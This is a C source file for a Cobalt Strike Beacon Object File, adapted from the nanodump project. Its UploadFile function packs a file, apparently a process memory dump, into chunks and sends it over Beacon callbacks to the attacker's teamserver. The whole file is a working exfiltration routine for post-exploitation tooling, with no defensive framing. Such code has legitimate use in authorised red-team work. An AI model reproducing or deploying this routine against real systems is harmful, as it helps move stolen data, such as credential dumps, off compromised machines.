#include "bofdefs.h"

#define CALLBACK_FILE 0x02
#define CALLBACK_FILE_WRITE 0x08
#define CALLBACK_FILE_CLOSE 0x09
#define CHUNK_SIZE 0xe1000

// https://github.com/helpsystems/nanodump/blob/3262e14d2652e21a9e7efc3960a796128c410f18/source/utils.c#L630-L728
BOOL UploadFile(LPCSTR fileName, char fileData[], ULONG32 fileLength) {
  int fileNameLength = MSVCRT$strnlen(fileName, 256);

  // intializes the random number generator
  time_t t;
  MSVCRT$srand((unsigned)MSVCRT$time(&t));

  // generate a 4 byte random id, rand max value is 0x7fff
  ULONG32 fileId = 0;
  fileId |= (MSVCRT$rand() & 0x7FFF) << 0x11;
  fileId |= (MSVCRT$rand() & 0x7FFF) << 0x02;
  fileId |= (MSVCRT$rand() & 0x0003) << 0x00;

  // 8 bytes for fileId and fileLength
  int messageLength = 8 + fileNameLength;
  char *packedData = intAlloc(messageLength);
  if (!packedData) {
    BeaconPrintf(CALLBACK_ERROR, "Could not download the dump");
    return FALSE;
  }

  // pack on fileId as 4-byte int first
  packedData[0] = (fileId >> 0x18) & 0xFF;
  packedData[1] = (fileId >> 0x10) & 0xFF;
  packedData[2] = (fileId >> 0x08) & 0xFF;
  packedData[3] = (fileId >> 0x00) & 0xFF;

  // pack on fileLength as 4-byte int second
  packedData[4] = (fileLength >> 0x18) & 0xFF;
  packedData[5] = (fileLength >> 0x10) & 0xFF;
  packedData[6] = (fileLength >> 0x08) & 0xFF;
  packedData[7] = (fileLength >> 0x00) & 0xFF;

  // pack on the file name last
  for (int i = 0; i < fileNameLength; i++) {
    packedData[8 + i] = fileName[i];
  }

  // tell the teamserver that we want to download a file
  BeaconOutput(CALLBACK_FILE, packedData, messageLength);
  intFree(packedData);
  packedData = NULL;

  // we use the same memory region for all chucks
  int chunkLength = 4 + CHUNK_SIZE;
  char *packedChunk = intAlloc(chunkLength);
  if (!packedChunk) {
    BeaconPrintf(CALLBACK_ERROR, "Could not download the dump");
    return FALSE;
  }
  // the fileId is the same for all chunks
  packedChunk[0] = (fileId >> 0x18) & 0xFF;
  packedChunk[1] = (fileId >> 0x10) & 0xFF;
  packedChunk[2] = (fileId >> 0x08) & 0xFF;
  packedChunk[3] = (fileId >> 0x00) & 0xFF;

  ULONG32 exfiltrated = 0;
  while (exfiltrated < fileLength) {
    // send the file content by chunks
    chunkLength = fileLength - exfiltrated > CHUNK_SIZE
                      ? CHUNK_SIZE
                      : fileLength - exfiltrated;
    ULONG32 chunkIndex = 4;
    for (ULONG32 i = exfiltrated; i < exfiltrated + chunkLength; i++) {
      packedChunk[chunkIndex++] = fileData[i];
    }
    // send a chunk
    BeaconOutput(CALLBACK_FILE_WRITE, packedChunk, 4 + chunkLength);
    exfiltrated += chunkLength;
  }
  intFree(packedChunk);
  packedChunk = NULL;

  // tell the teamserver that we are done writing to this fileId
  char packedClose[4];
  packedClose[0] = (fileId >> 0x18) & 0xFF;
  packedClose[1] = (fileId >> 0x10) & 0xFF;
  packedClose[2] = (fileId >> 0x08) & 0xFF;
  packedClose[3] = (fileId >> 0x00) & 0xFF;
  BeaconOutput(CALLBACK_FILE_CLOSE, packedClose, 4);
  return TRUE;
}